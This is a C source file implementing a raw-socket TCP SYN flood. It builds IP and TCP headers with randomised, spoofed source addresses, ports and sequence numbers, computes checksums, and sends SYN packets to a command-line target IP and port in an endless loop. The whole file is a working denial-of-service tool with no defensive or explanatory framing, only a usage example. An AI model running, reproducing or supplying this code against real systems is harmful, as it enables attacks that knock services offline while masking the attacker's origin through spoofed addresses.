#include <stdio.h>
#include <string.h>
#include <sys/types.h>  
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <stdlib.h>
#include <sys/time.h>

typedef struct send_hdr{
    struct iphdr i_hdr;
    struct tcphdr t_hdr;
}syn_t;

struct pse_hdr {
    uint32_t	saddr;
    uint32_t	daddr;
    uint8_t		pad;
    uint8_t		protocol;
    uint16_t	len;
};

typedef struct 
{
    struct pse_hdr p_hdr;
    struct tcphdr t_hdr;
}csum_t;


unsigned short csum(char *buf, int size)
{
    unsigned short *base = (unsigned short *)buf;
    unsigned long sum = 0;

    while (size > 1)
    {
        sum += *(base++);
        if (sum >> 16)
            sum = (sum >> 16) + (sum & 0xffff);
        size -= 2;
    }

    if (1 == size)
        sum += *((unsigned char *)base);
    while (sum >> 16)
        sum = (sum >> 16) + (sum & 0xffff);

    return ~sum;
}


void cal_tcp_checksum(syn_t *hdr)
{
    char *base = (char *)hdr;
    struct iphdr *i_hdr = &(hdr->i_hdr);
    struct tcphdr *t_hdr = &(hdr->t_hdr);

    csum_t c_buf;

    memset(&c_buf, 0, sizeof(c_buf));
    c_buf.p_hdr.saddr = i_hdr->saddr;
    c_buf.p_hdr.daddr = i_hdr->daddr;
    c_buf.p_hdr.pad = 0;
    c_buf.p_hdr.protocol = i_hdr->protocol;
    c_buf.p_hdr.len = htons(sizeof(struct tcphdr));

    //memcpy((char *)(&c_buf) + sizeof(struct pse_hdr), base + sizeof(struct iphdr), sizeof(csum_t) - sizeof(struct pse_hdr));
    //printf("%d  %d\n", sizeof(struct pse_hdr), sizeof(struct iphdr));
    memcpy(&c_buf.t_hdr, &hdr->t_hdr, sizeof(struct tcphdr));

    t_hdr->check = csum((char *)(&c_buf), (sizeof(csum_t)));
    //printf("tcp check = %#x\n", t_hdr->check);
}

void build_ip_header(syn_t *hdr, struct sockaddr_in *dstaddr)
{
    struct iphdr *p_hdr = &(hdr->i_hdr);

    p_hdr->version = 4;
    p_hdr->ihl = 5;
    p_hdr->tos = 0;
    p_hdr->tot_len = htons(sizeof(syn_t));
    p_hdr->id = htons((uint32_t)rand());
    p_hdr->frag_off = 0;
    p_hdr->ttl = 64;
    p_hdr->protocol = IPPROTO_TCP;
    p_hdr->check = 0;
    p_hdr->saddr = (uint32_t)(rand());
    //p_hdr->saddr = dstaddr->sin_addr.s_addr;
    p_hdr->daddr = dstaddr->sin_addr.s_addr;

    p_hdr->check = csum((char *)p_hdr, sizeof(struct iphdr));
    //printf("ip check = %#x\n", p_hdr->check);
}

void build_tcp_header(syn_t *hdr, struct sockaddr_in *dstaddr, uint16_t dport)
{
    struct tcphdr *p_hdr = &(hdr->t_hdr);

    p_hdr->source = htons((uint16_t)(rand()));
    p_hdr->dest = htons(dport);
    p_hdr->seq = htonl(rand());
    p_hdr->ack_seq = htonl((rand()));
    p_hdr->res1 = 0;
    p_hdr->doff = sizeof(struct tcphdr)/4;
    p_hdr->fin = 0;
    p_hdr->syn = 1;
    p_hdr->rst = 0;
    p_hdr->psh = 0;
    p_hdr->ack = 0;
    p_hdr->urg = 0;
    p_hdr->res2 = 0;
    p_hdr->window = htons(65535);
    p_hdr->check = htons(0);
    p_hdr->urg_ptr = htons(0);
}

void usage()
{
    fprintf(stderr, "exampe:./app 192.168.3.115 7881\n");
}

int main(int c, char **v)
{
    int sd, ret;
    struct sockaddr_in dst;
    socklen_t len;
    syn_t packet;
    int opt;

    time_t uptime = time(NULL);
    if (c != 3){
        usage();
        return -1;
    }

    len = sizeof(dst);
    dst.sin_family = AF_INET;
    dst.sin_port = htons(atoi(v[2]));
    inet_pton(AF_INET, v[1], &dst.sin_addr);

    sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (-1 == sd){
        perror("socket");
        return -1;
    }	

    while (1)
    {
        srand(uptime);
        build_ip_header(&packet, &dst);
        build_tcp_header(&packet, &dst, atoi(v[2]));
        cal_tcp_checksum(&packet);

        ret = sendto(sd, &packet, sizeof(packet), 0, (struct sockaddr *)&dst, len);
        uptime += 100;
    }
    close(sd);
    return 0;
}
